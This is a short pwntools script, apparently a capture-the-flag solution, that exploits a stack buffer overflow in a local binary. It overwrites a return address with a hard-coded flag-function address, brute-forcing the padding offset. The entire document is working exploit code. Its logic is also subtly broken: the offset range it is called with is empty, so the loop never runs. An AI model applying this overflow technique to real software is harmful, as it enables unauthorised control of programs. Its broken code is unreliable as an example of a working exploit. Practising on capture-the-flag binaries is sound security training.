from pwn import *
from typing import cast

context.log_level = 'debug'
context.terminal = ["tmux", "split-window", "-h"]

def exploit(target_path: Path, flag_address: int, buffer_size: int, read_size: int):
    for offset in range(buffer_size, read_size):
        target = process([str(target_path)])
        target.sendline(_payload(flag_address=flag_address, offset=offset))
        output = cast(bytes, target.recvall(timeout=1))
        if str(target_path).encode() not in output and len(output) > 1024:
            print(output.decode())
            break
    
def _payload(
    flag_address: int,
    offset: int,
):
    return b"A" * offset + p32(flag_address)

exploit("target", 0x080EDFA0, 512, 256)